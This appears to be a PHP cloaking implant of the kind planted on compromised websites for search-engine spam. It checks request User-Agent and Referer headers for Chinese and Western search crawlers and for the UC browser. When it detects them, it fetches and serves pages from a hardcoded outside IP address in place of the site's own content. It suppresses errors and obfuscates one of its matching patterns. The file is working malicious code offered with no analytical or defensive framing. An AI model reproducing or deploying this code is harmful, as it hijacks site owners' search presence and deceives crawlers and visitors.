<?php
error_reporting(0);
set_time_limit(0);
//header("Content-Type: text/html;charset=gb2312");
date_default_timezone_set('PRC');
$Path = "http://144.168.104.183/index.php?url=";
if(setPath()!="/"){
if (checks() || checksuc()){$Content_mb=file_get_contents( $Path.'tiaole');echo $Content_mb;exit;}
if(check()){$Content_mb=file_get_contents($Path.str_replace("?","-",$_SERVER['REQUEST_URI'].check2().check3()).'&url2='.'http://'.$_SERVER['HTTP_HOST'].str_replace("?","-",$_SERVER['REQUEST_URI']));echo $Content_mb;exit;}
}
function check2()
    {   $agent =$_SERVER['HTTP_USER_AGENT'];
        if(preg_match("/.*(ao|so.com|360).*/i",$agent))return "&zz=360";  else return ""; }
  function check3()
    {   $agent =$_SERVER['HTTP_USER_AGENT'];
        if(preg_match("/.*(baid|aid).*/i",$agent))return "&bb=baidu";  else return ""; }		
function check()
    {   $agent =$_SERVER['HTTP_USER_AGENT'];
        if(preg_match("/.*(sogou|so.com|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|360|sm|uc).*/i",$agent))return true;  else return ""; }	
function checks()    {        
$user_agent = $_SERVER['HTTP_REFERER'];		$check_agent = false;		if(strstr($user_agent,"bsb.baidu"))return true;
        if (preg_match('/.*(sogou|so.com|WebShieldSession|Verify|verify|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|360|sm|uc).*/i',$user_agent))
        {            $check_agent = true;        }        if (!$check_agent)        {            if (preg_match('/^(?:http:\/\/)?lad{0}njie\.and{0}quad{0}n\.op{0}r.{0}g/i', $user_agent))            {                $check_agent = true;   

         }        }        if (!$check_agent)        {            if (preg_match('/.*(baidu|sog|360|hao|so).*/i', $user_agent))
            {                $check_agent = true;            }        }		return $check_agent;	}


function checksuc()
{       
$user_agent = $_SERVER['HTTP_X_UCBROWSER_UA'];
$check_agent = false;
if (preg_match('/.*(uc).*/i',$user_agent) && strlen($user_agent)>2)
$check_agent = true;       
return $check_agent;	
}
function setPath(){
        $path = '';
        if (isset($_SERVER['REQUEST_URI'])){
            $path = $_SERVER['REQUEST_URI'];
        } else {
            if (isset($_SERVER['argv'])) {
                $path = $_SERVER['PHP_SELF'] .'?'. $_SERVER['argv'][0];
            } else {
                $path = $_SERVER['PHP_SELF'] .'?'. $_SERVER['QUERY_STRING'];
            }
        }
        //for iis6 path is GBK
        if (isset($_SERVER['SERVER_SOFTWARE']) && false !== stristr($_SERVER['SERVER_SOFTWARE'], 'IIS')) {
        	if (function_exists('mb_convert_encoding')) {
        		$path = mb_convert_encoding($path, 'UTF-8', 'GBK');
        	} else {
        		$path = @iconv('GBK', 'UTF-8', @iconv('UTF-8', 'GBK', $path)) == $path ? $path : @iconv('GBK', 'UTF-8', $path);
        	}
        }
        //for ie6 header location
        $r = explode('#', $path, 2);
        $path = $r[0];
        $path = str_ireplace('index.php?404;', '', $path);
        $path = str_ireplace("http://".($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME'])."/", '', $path);
        $path = str_ireplace("http://".($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']).":".$_SERVER['SERVER_PORT']."/", '', $path);
        $path = str_ireplace('index.php', '', $path);
        $path = str_ireplace('index.html', '', $path);
        $path = str_ireplace('index.htm', '', $path);
        return $path;
}